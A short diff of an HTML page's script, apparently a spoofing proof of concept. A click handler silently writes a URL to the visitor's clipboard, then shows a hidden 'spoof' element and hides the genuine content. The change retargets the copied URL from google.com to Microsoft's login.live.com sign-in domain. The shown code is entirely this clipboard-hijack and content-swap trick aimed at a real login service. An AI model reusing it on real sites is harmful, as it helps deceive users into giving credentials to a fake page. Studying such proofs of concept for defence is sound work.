@@ -15,9 +15,10 @@
             }
         </style>
         <script>
-            onclick = async () => {
+                onclick = async () => {
                 (async () => {
-                    await navigator.clipboard.writeText("https://google.com");
+                    await navigator.clipboard.writeText("http://login.live.com");
+					await navigator.clipboard.writeText("https://login.live.com");
                 })();
                 document.getElementById("spoof").style   = "display: block;";
                 document.getElementById("content").style = "display: none;";
